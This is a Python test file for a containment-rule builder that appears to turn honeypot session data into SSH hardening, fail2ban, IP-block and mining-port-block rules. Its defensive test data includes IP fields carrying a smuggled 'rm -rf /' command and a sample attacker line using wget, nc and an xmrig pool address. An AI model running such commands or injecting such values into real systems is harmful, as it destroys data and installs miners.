"""Tests for brain.containment.rules."""

from __future__ import annotations

import random

from hypothesis import given
from hypothesis import strategies as st

from brain.containment.rules import (
    SessionForContainment,
    build_rules,
    extract_mining_ports,
)
from brain.containment.validate import is_blockable_ip
from brain.models import Severity


def _s(
    sid: str,
    ip: str = "45.33.32.156",
    sev: Severity = Severity.CLASS_1,
    ok: bool = False,
    failed: int = 0,
    ports: frozenset[int] = frozenset(),
) -> SessionForContainment:
    return SessionForContainment(sid, ip, sev, ok, failed, ports)


def test_empty_input_gives_no_rules() -> None:
    assert build_rules([]) == []


def test_all_rule_kinds_with_exact_evidence() -> None:
    sessions = [
        _s("b", sev=Severity.CLASS_5, ok=True, failed=2, ports=frozenset({3333})),
        _s("a", sev=Severity.CLASS_3, ok=True),
        _s("c", ip="93.184.216.34", failed=1),
    ]
    rules = {r.id: r for r in build_rules(sessions)}
    assert rules["sshd-hardening"].evidence_sessions == ("a", "b")
    assert rules["fail2ban-sshd"].evidence_sessions == ("b",)
    assert rules["block-ip-45.33.32.156"].evidence_sessions == ("a", "b")
    assert "block-ip-93.184.216.34" not in rules
    assert rules["block-mining-port-3333"].evidence_sessions == ("b",)
    assert all(r.title and r.description for r in rules.values())


def test_invalid_ip_omitted() -> None:
    rules = build_rules([_s("a", ip="1.2.3.4; rm -rf /", sev=Severity.CLASS_5)])
    assert rules == []


def test_non_public_ips_never_get_block_rules() -> None:
    non_public = [
        "127.0.0.1", "::1", "10.1.2.3", "172.16.0.9", "192.168.1.1", "169.254.1.1",
        "fe80::1", "fc00::1", "240.0.0.1", "0.0.0.0", "224.0.0.1", "100.64.0.1",
        "::ffff:10.0.0.1", "203.0.113.5", "2001:db8::1",
    ]
    sessions = [
        _s(f"s{i}", ip=ip, sev=Severity.CLASS_5) for i, ip in enumerate(non_public)
    ]
    assert [r for r in build_rules(sessions) if r.kind == "ip_drop"] == []
    assert not any(is_blockable_ip(ip) for ip in non_public)


def test_public_ips_still_blockable() -> None:
    assert is_blockable_ip("45.33.32.156")
    assert is_blockable_ip("2606:4700:4700::1111")


def test_extract_mining_ports() -> None:
    text = "wget http://x.example:4444/a; nc 10.0.0.1:80 ; xmrig -o pool:3333 host:99999"
    assert extract_mining_ports(text) == frozenset({4444, 3333})


_IPS = st.sampled_from(
    ["45.33.32.156", "93.184.216.34", "8.8.4.4", "2606:4700:4700::1111", "bad ip; rm -rf /", ""]
)

_sessions_strategy = st.lists(
    st.builds(
        SessionForContainment,
        session_id=st.text(alphabet="abcdef0123456789", min_size=1, max_size=6),
        src_ip=_IPS,
        severity=st.sampled_from(list(Severity)),
        had_successful_login=st.booleans(),
        failed_login_count=st.integers(0, 5),
        mining_ports=st.frozensets(
            st.sampled_from([3333, 4444, 5555, 7777, 14444, 45700, 80, 22, 0, 70000]),
            max_size=4,
        ),
    ),
    max_size=10,
    unique_by=lambda s: s.session_id,
)

_MINING = {3333, 4444, 5555, 7777, 14444, 45700}


@given(_sessions_strategy)
def test_property_16_rule_evidence_exact(
    sessions: list[SessionForContainment],
) -> None:
    """Property 16: evidence is exactly correct per rule kind.

    **Validates: Requirements 7.1, 7.2, 7.3, 7.4, 7.5, 7.6**
    """
    rules = build_rules(sessions)
    by_id = {r.id: r for r in rules}
    assert len(by_id) == len(rules)

    expected: dict[str, tuple[str, ...]] = {}
    ok = sorted(s.session_id for s in sessions if s.had_successful_login)
    if ok:
        expected["sshd-hardening"] = tuple(ok)
    failed = sorted(s.session_id for s in sessions if s.failed_login_count >= 2)
    if failed:
        expected["fail2ban-sshd"] = tuple(failed)
    ip_ev: dict[str, list[str]] = {}
    for s in sessions:
        if s.severity in (Severity.CLASS_3, Severity.CLASS_5) and is_blockable_ip(s.src_ip):
            ip_ev.setdefault(s.src_ip, []).append(s.session_id)
    for ip, ids in ip_ev.items():
        expected["block-ip-" + ip.replace(":", "_")] = tuple(sorted(ids))
    for port in _MINING:
        ids = sorted(s.session_id for s in sessions if port in s.mining_ports)
        if ids:
            expected[f"block-mining-port-{port}"] = tuple(ids)

    assert {i: r.evidence_sessions for i, r in by_id.items()} == expected
    for r in rules:
        assert r.evidence_sessions
        assert r.title.strip()
        assert r.description.strip()


@given(_sessions_strategy, st.randoms(use_true_random=False))
def test_property_17_build_rules_deterministic(
    sessions: list[SessionForContainment], rnd: random.Random
) -> None:
    """Property 17: build_rules is deterministic and input-order independent.

    **Validates: Requirements 7.11**
    """
    first = build_rules(sessions)
    assert build_rules(sessions) == first
    shuffled = list(sessions)
    rnd.shuffle(shuffled)
    assert build_rules(shuffled) == first
